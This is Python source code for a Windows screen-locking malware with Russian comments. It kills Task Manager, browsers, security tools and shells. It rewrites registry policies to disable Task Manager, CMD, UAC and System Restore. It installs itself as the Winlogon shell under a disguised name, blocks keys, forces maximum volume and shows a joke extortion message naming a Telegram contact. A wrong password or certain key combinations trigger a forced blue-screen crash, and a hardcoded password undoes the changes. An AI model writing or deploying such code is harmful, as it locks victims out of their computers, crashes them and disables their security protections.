import ctypes

import keyboard
import pygame
import sys
import os
import shutil
import time
from ctypes import windll, c_int, c_uint, c_ulong, byref, POINTER
import subprocess

import winreg as reg
import win32gui
import win32con

from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume

# Константы для раскладок
LANG_ENGLISH_US = 0x0409  # Код для английской раскладки
HWND_BROADCAST = 0xFFFF
WM_INPUTLANGCHANGEREQUEST = 0x0050

# Загрузка раскладки
def set_keyboard_layout(language_code):
    user32 = ctypes.WinDLL("user32")
    layout = user32.LoadKeyboardLayoutW(f"{language_code:04X}{language_code:04X}", 1)
    user32.PostMessageW(HWND_BROADCAST, WM_INPUTLANGCHANGEREQUEST, 0, layout)

set_keyboard_layout(LANG_ENGLISH_US)

def copy_self_to_target(target_dir, target_name):
    """
    Копирует текущее исполняемое приложение в указанную директорию под указанным именем.
    """
    if getattr(sys, 'frozen', False):
        # Если программа 'заморожена' (собрана в exe)
        current_file_path = sys.executable
    else:
        # Иначе используется текущий .py файл
        current_file_path = os.path.abspath(__file__)

    target_path = os.path.join(target_dir, target_name)

    try:
        # Проверка существования директории назначения
        if not os.path.exists(target_dir):
            os.makedirs(target_dir)

        # Копирование файла
        shutil.copy2(current_file_path, target_path)
        print(f"Файл успешно скопирован в: {target_path}")
    except Exception as e:
        print(f"Ошибка при копировании: {e}")

def kill_app():
    try:
        subprocess.call("taskkill /F /IM explorer.exe", shell=True)
        subprocess.call("taskkill /F /IM taskmgr.exe", shell=True)
        subprocess.call("taskkill /F /IM regedit.exe", shell=True)
        subprocess.call("taskkill /F /IM notepad.exe", shell=True)
        subprocess.call("taskkill /F /IM resmon.exe", shell=True)
        subprocess.call("taskkill /F /IM control.exe", shell=True)
        subprocess.call("taskkill /F /IM firefox.exe", shell=True)
        subprocess.call("taskkill /F /IM chrome.exe", shell=True)
        subprocess.call("taskkill /F /IM ProcessHacker.exe", shell=True)
        subprocess.call("taskkill /F /IM perfmon.exe", shell=True)
        subprocess.call("taskkill /F /IM powershell.exe", shell=True)
        subprocess.call("taskkill /F /IM mrt.exe", shell=True)
        subprocess.call("taskkill /F /IM SecHealthUI.exe", shell=True)
        subprocess.call("taskkill /F /IM javaw.exe", shell=True)
        subprocess.call("taskkill /F /IM discord.exe", shell=True)
        subprocess.call("taskkill /F /IM opera.exe", shell=True)
        subprocess.call("taskkill /F /IM browser.exe", shell=True)
        subprocess.call("taskkill /F /IM telegram.exe", shell=True)
        subprocess.call("taskkill /F /IM cmd.exe", shell=True)
    except:
        print("похуй мне")

def MinusRegedit():
    commands = [
        r'REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoLowDiskSpaceChecks /t REG_DWORD /d 1 /f',
        r'REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoDriveTypeAutoRun /t REG_DWORD /d 255 /f',
        r'REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoLogoff /t REG_DWORD /d 1 /f',
        r'REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoControlPanel /t REG_DWORD /d 1 /f',
        r'REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoStartMenuPinnedList /t REG_DWORD /d 1 /f',
        r'REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoStartMenuMorePrograms /t REG_DWORD /d 1 /f',
        r'REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoStartMenuMyGames /t REG_DWORD /d 1 /f',
        r'REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoStartMenuMyMusic /t REG_DWORD /d 1 /f',
        r'REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoStartMenuNetworkPlaces /t REG_DWORD /d 1 /f',
        r'REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v HideClock /t REG_DWORD /d 1 /f',
        r'REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableTaskMgr /t REG_DWORD /d 1 /f',
        r'REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v HideFastUserSwitching /t REG_DWORD /d 1 /f',
        r'REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableChangePassword /t REG_DWORD /d 1 /f',
        r'REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableLockWorkstation /t REG_DWORD /d 1 /f',
        r'REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA /t REG_DWORD /d 0 /f',
        r'REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows NT\SystemRestore" /v DisableConfig /t REG_DWORD /d 1 /f',
        r'REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoDrives /t REG_DWORD /d 4 /f',
        r'REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoDesktop /t REG_DWORD /d 1 /f',
        r'REG ADD "HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\System" /v DisableCMD /t REG_DWORD /d 2 /f',
        r'REG ADD "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoRun /t REG_DWORD /d 1 /f',
        r'REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableRegistryTools /t REG_DWORD /d 0 /f',
    ]
    # Выполнение всех команд в одном месте
    for command in commands:
        try:
            subprocess.run(command, check=True, shell=True)
            print(f"Команда выполнена: {command}")
        except subprocess.CalledProcessError as e:
            print(f"Ошибка при выполнении команды: {e}")

def change_shell():
    try:
        key = reg.CreateKey(reg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows NT\CurrentVersion\Winlogon")
        reg.SetValueEx(key, "shell", 0, reg.REG_SZ, "C:\Windows\INF\c_usbdevice.exe")
        reg.CloseKey(key)
    except Exception as e:
        print(f"Ошибка при установке значения реестра: {e}")

def fix_shell():
    try:
        key = reg.CreateKey(reg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows NT\CurrentVersion\Winlogon")
        reg.SetValueEx(key, "shell", 0, reg.REG_SZ, "explorer.exe")
        reg.CloseKey(key)
    except Exception as e:
        print(f"Ошибка при установке значения реестра: {e}")


MinusRegedit()

# Инициализация Pygame
pygame.init()
pygame.mixer.init()

# Установка разрешения экрана
SCREEN_RESOLUTION = (800, 600)

# Создание полноэкранного окна с заданным разрешением
screen = pygame.display.set_mode(SCREEN_RESOLUTION, pygame.FULLSCREEN)
hwnd = pygame.display.get_wm_info()["window"]
kill_app()

target_directory = r"C:\Windows\INF"
target_filename = "c_usbdevice.exe"
copy_self_to_target(target_directory, target_filename)
change_shell()

def get_current_volume():
    """ Получает текущий уровень громкости через pycaw """
    devices = AudioUtilities.GetSpeakers()
    interface = devices.Activate(
        IAudioEndpointVolume._iid_, 0, None)
    # Преобразуем interface в правильный тип для вызова метода
    volume = interface.QueryInterface(IAudioEndpointVolume)
    return volume.GetMasterVolumeLevelScalar()  # Используем корректный интерфейс

def set_volume(volume_level):
    """ Устанавливает уровень громкости через pycaw """
    devices = AudioUtilities.GetSpeakers()
    interface = devices.Activate(
        IAudioEndpointVolume._iid_, 0, None)
    # Преобразуем interface в правильный тип для вызова метода
    volume = interface.QueryInterface(IAudioEndpointVolume)
    volume.SetMasterVolumeLevelScalar(volume_level, None)


def bring_window_to_front(hwnd):
    """Переводим окно в передний план с помощью SetWindowPos"""
    # Восстановить окно, если оно свернуто
    win32gui.ShowWindow(hwnd, win32con.SW_RESTORE)
    # Установить окно поверх всех
    win32gui.SetWindowPos(hwnd, win32con.HWND_TOPMOST, 0, 0, 0, 0, win32con.SWP_NOMOVE | win32con.SWP_NOSIZE)
    # Принудительно установить окно на передний план
    win32gui.SetWindowPos(hwnd, win32con.HWND_TOP, 0, 0, 0, 0, win32con.SWP_NOMOVE | win32con.SWP_NOSIZE)

def force_focus(hwnd):
    """Принудительное удержание фокуса в окне"""
    win32gui.SetFocus(hwnd)


if getattr(sys, 'frozen', False):
    # Если программа 'заморожена' (собрана в exe)
    application_path = sys._MEIPASS
else:
    # Иначе используем текущую директорию
    application_path = os.path.dirname(os.path.abspath(__file__))

# Загрузка изображения фона
background_path = os.path.join(application_path, 'background.png')
background = pygame.image.load(background_path)

music_path = os.path.join(application_path, "music.wav")
pygame.mixer.music.load(music_path)
pygame.mixer.music.play(-1)  # Бесконечное воспроизведение

# Масштабирование изображения под размер экрана
background = pygame.transform.scale(background, SCREEN_RESOLUTION)

def PlusRegedit():
    commands = [
        r'REG DELETE "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoLowDiskSpaceChecks /f',
        r'REG DELETE "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoDriveTypeAutoRun /f',
        r'REG DELETE "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoLogoff /f',
        r'REG DELETE "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoControlPanel /f',
        r'REG DELETE "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoStartMenuPinnedList /f',
        r'REG DELETE "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoStartMenuMorePrograms /f',
        r'REG DELETE "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoStartMenuMyGames /f',
        r'REG DELETE "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoStartMenuMyMusic /f',
        r'REG DELETE "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoStartMenuNetworkPlaces /f',
        r'REG DELETE "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v HideClock /f',
        r'REG DELETE "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableTaskMgr /f',
        r'REG DELETE "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v HideFastUserSwitching /f',
        r'REG DELETE "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableChangePassword /f',
        r'REG DELETE "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableLockWorkstation /f',
        r'REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA /t REG_DWORD /d 1 /f',
        r'REG DELETE "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows NT\SystemRestore" /v DisableConfig /f',
        r'REG DELETE "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoDrives /f',
        r'REG DELETE "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoDesktop /f',
        r'REG DELETE "HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\System" /v DisableCMD /f',
        r'REG DELETE "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoRun /f',
        r'REG DELETE "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableRegistryTools /f'
    ]

    for command in commands:
        try:
            subprocess.run(command, check=True, shell=True)
            print(f"Команда выполнена: {command}")
        except subprocess.CalledProcessError as e:
            print(f"Ошибка при выполнении команды: {e}")

def BSOD():
    null_pointer = POINTER(c_int)()
    privilege_id = c_uint(19)
    enable_privilege = c_uint(1)
    current_thread = c_uint(0)
    privilege_status = c_int()
    windll.ntdll.RtlAdjustPrivilege(
        privilege_id,
        enable_privilege,
        current_thread,
        byref(privilege_status)
    )
    error_code = c_ulong(0xC000007B)
    arg_count = c_ulong(0)
    response_status = c_uint()
    windll.ntdll.NtRaiseHardError(
        error_code,
        arg_count,
        null_pointer,
        null_pointer,
        c_uint(6),
        byref(response_status)
    )

def block_keys():
    """Блокирует клавиши: Win, Ctrl, Tab, Alt, Delete, Shift."""
    keys_to_block = ['win', 'ctrl', 'tab', 'alt', 'delete', 'shift', 'f4']
    for key in keys_to_block:
        keyboard.block_key(key)

def create_text_surface(text, font_name, font_size, text_color, bg_color=None):
    """
    Создает поверхность с текстом и возвращает её.

    Аргументы:
        text (str): Текст для отображения.
        font_name (str): Название шрифта. Если None, используется системный шрифт.
        font_size (int): Размер шрифта.
        text_color (tuple): Цвет текста в формате (R, G, B).
        bg_color (tuple, optional): Цвет фона в формате (R, G, B). Если None, фон прозрачный.

    Возвращает:
        tuple: Поверхность с текстом и её прямоугольник (Surface, Rect).
    """
    font = pygame.font.Font(font_name, font_size)
    text_surface = font.render(text, True, text_color, bg_color)
    text_rect = text_surface.get_rect()
    return text_surface, text_rect

def draw_multiline_text(screen, text, font_name, font_size, text_color, bg_color, position, line_spacing=5):
    """
    Отрисовывает многострочный текст на экране, разделяя его на блоки по пустым строкам.

    Аргументы:
        screen (pygame.Surface): Поверхность, на которой будет отрисован текст.
        text (str): Многострочный текст.
        font_name (str): Название шрифта. Если None, используется системный шрифт.
        font_size (int): Размер шрифта.
        text_color (tuple): Цвет текста в формате (R, G, B).
        bg_color (tuple): Цвет фона в формате (R, G, B).
        position (tuple): Позиция текста на экране (x, y).
        line_spacing (int, optional): Расстояние между строками. По умолчанию 5.
    """
    font = pygame.font.Font(font_name, font_size)
    blocks = text.split('\n\n')  # Разделяем текст на блоки по пустым строкам
    y_offset = position[1]  # Начальная позиция по Y

    for block in blocks:
        lines = block.splitlines()  # Разделяем блок на строки
        max_width = max(font.size(line)[0] for line in lines)  # Максимальная ширина строки
        total_height = sum(font.size(line)[1] for line in lines) + (len(lines) - 1) * line_spacing  # Общая высота
        block_surface = pygame.Surface((max_width, total_height), pygame.SRCALPHA)
        if bg_color:
            block_surface.fill(bg_color)

        block_y_offset = 0
        for line in lines:
            line_surface, line_rect = create_text_surface(line, font_name, font_size, text_color)
            block_surface.blit(line_surface, (0, block_y_offset))
            block_y_offset += line_rect.height + line_spacing

        screen.blit(block_surface, (position[0], y_offset))
        y_offset += total_height + line_spacing * 2  # Добавляем дополнительное расстояние между блоками

def main():
    """
    Основной цикл программы. Обрабатывает события и отрисовывает изображение на экране.
    """

    start_time = time.time()
    time_limit = 5 * 60  # Лимит времени в секундах (5 минут)


    # Большой текст с пустыми строками для разделения на блоки
    big_text = """Your computer is locked due to your active involvement in 
interfering with the 2024 U.S. elections. You voted 37 times for 
Trump, 12 times for Biden, and once for Morris the cat from the 
neighboring apartment. Evidence includes an attempt to hack the 
election system through Minecraft from your IP address, spreading 
memes with fake election results on TikTok, and commenting "Trump 2028" 
on Biden's Instagram post.

To unlock your computer, write to @UNBLOCK_COMPUTER on Telegram, confess 
everything, send a photo of your favorite mug with the inscription "Make America Great Again" 
or "I Voted for Biden (No Regrets)," and write: "I will no longer interfere in elections. 
I promise to vote only once next time. Or twice. Maximum three."

If you do not unlock your computer within 5 minutes, your data will be forwarded to Joe Biden, 
Donald Trump, and Elon Musk. Even if you believe this is a mistake, write to Telegram anyway."""

    # Создание текста с помощью функции create_text_surface
    text_surface, text_rect = create_text_surface(
        text="Time Left:",
        font_name=None,  # Используем системный шрифт
        font_size=54,
        text_color=(0, 0, 0),  # Черный цвет текста
        bg_color=(255, 255, 0),  # Желтый фон
    )
    text_rect.topleft = (70, 10)  # Позиционируем текст

    text_surface2, text_rect2 = create_text_surface(
        text="05:00",
        font_name=None,  # Используем системный шрифт
        font_size=54,
        text_color=(0, 0, 0),  # Черный цвет текста
        bg_color=(255, 0, 0),  # Красный фон
    )
    text_rect2.topleft = (260, 10)  # Позиционируем текст

    # Создание текста "Введите пароль:"
    text_surface3, text_rect3 = create_text_surface(
        text="Enter password:",
        font_name=None,  # Используем системный шрифт
        font_size=54,
        text_color=(0, 0, 0),  # Черный цвет текста
        bg_color=(255, 255, 0),  # Желтый фон
    )
    text_rect3.topleft = (70, SCREEN_RESOLUTION[1] - text_rect3.height - 120)  # Отступ от нижнего края

    # Поле ввода пароля
    input_box_width = 200  # Ширина поля ввода
    input_box_height = 40  # Высота поля ввода
    input_box = pygame.Rect(
        text_rect3.right + 10,  # Начинаем справа от текста "Введите пароль:" с отступом 10 пикселей
        text_rect3.top,  # Выравниваем по верхнему краю текста
        input_box_width,  # Ширина поля ввода
        input_box_height  # Высота поля ввода
    )
    color_inactive = pygame.Color('yellow')  # Желтая рамка для неактивного состояния
    color_active = pygame.Color('yellow')  # Желтая рамка для активного состояния
    active = False  # Флаг активности поля ввода
    text = ''  # Текст в поле ввода
    font = pygame.font.Font(None, 32)  # Шрифт для поля ввода

    while True:
        # Проверка времени
        elapsed_time = time.time() - start_time
        remaining_time = max(time_limit - int(elapsed_time), 0)
        minutes = remaining_time // 60
        seconds = remaining_time % 60
        time_text = f"{minutes:02}:{seconds:02}"

        block_keys()
        bring_window_to_front(hwnd)
        force_focus(hwnd)
        current_volume = get_current_volume()

        # Если громкость меньше 100%, устанавливаем её на 100%
        if current_volume < 1.0:
            set_volume(1.0)  # Устанавливаем громкость на максимум


        # Обновление текста таймера
        text_surface2, text_rect2 = create_text_surface(
            text=time_text,
            font_name=None,
            font_size=54,
            text_color=(0, 0, 0),
            bg_color=(255, 0, 0),
        )
        text_rect2.topleft = (260, 10)

        # Отслеживание сочетаний клавиш
        if keyboard.is_pressed('win+del') or keyboard.is_pressed('win+g') or keyboard.is_pressed('win+l'):
            BSOD()
            pygame.quit()
            sys.exit()

        # Если время истекло, завершаем программу
        if remaining_time <= 0:
            pygame.quit()
            sys.exit()

        # Обработка событий
        for event in pygame.event.get():
            if event.type == pygame.QUIT:
                pygame.quit()
                sys.exit()
            # Выход по нажатию клавиши ESC
            if event.type == pygame.KEYDOWN:
                # Блокируем клавиши Win
                if event.key == pygame.K_ESCAPE:
                    pygame.quit()
                    sys.exit()
                if active:
                    if event.key == pygame.K_RETURN:
                        if text == "admin":
                            print("Успех! Пароль верный.")
                            PlusRegedit()
                            fix_shell()
                            pygame.quit()
                            sys.exit()
                        else:
                            print(f"Пароль не подходит. {text}")
                            text = 'WRONG'  # Заменяем текст на "WRONG"
                            # Запуск c_avc.exe параллельно
                            time.sleep(2)
                            BSOD()
                            # subprocess.Popen([c_avc_path])
                    elif event.key == pygame.K_BACKSPACE:
                        text = text[:-1]
                    else:
                        text += event.unicode
            if event.type == pygame.MOUSEBUTTONDOWN:
                # Если пользователь кликнул на поле ввода
                if input_box.collidepoint(event.pos):
                    active = not active
                else:
                    active = False
                # Меняем цвет поля ввода в зависимости от активности
                color = color_active if active else color_inactive

        # Отрисовка фона
        screen.blit(background, (0, 0))

        # Отрисовка текста
        screen.blit(text_surface, text_rect)
        screen.blit(text_surface2, text_rect2)
        screen.blit(text_surface3, text_rect3)  # Отрисовка "Введите пароль:"

        # Отрисовка большого текста с разделением на блоки
        draw_multiline_text(screen,
                            big_text,
                            None,
                            24,
                            (255, 255, 255),
                            (0, 0, 0),
                            (10, 100),
                            line_spacing=5)

        # Отрисовка поля ввода
        pygame.draw.rect(screen, (0, 0, 0), input_box)  # Черный фон
        txt_surface = font.render(text, True, (0, 0, 0))  # Рендер текста
        display_text = text

        # Обрезаем отображение, если текст шире поля
        txt_width = input_box.width - 10
        while font.size(display_text)[0] > txt_width:
            display_text = display_text[1:]  # Обрезаем начало для отображения

        txt_surface = font.render(display_text, True, (255, 255, 255))
        screen.blit(txt_surface, (input_box.x + 5, input_box.y + 5))

        # Обновление экрана
        pygame.display.flip()

# Запуск основной функции
if __name__ == "__main__":
    main()